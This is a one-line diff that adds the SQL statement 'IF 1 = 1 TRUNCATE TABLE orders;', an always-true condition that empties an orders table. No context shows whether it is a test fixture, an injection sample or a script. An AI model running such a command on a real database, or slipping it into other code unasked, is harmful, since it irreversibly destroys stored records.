@@ -1,0 +1,1 @@
+IF 1 = 1 TRUNCATE TABLE orders;
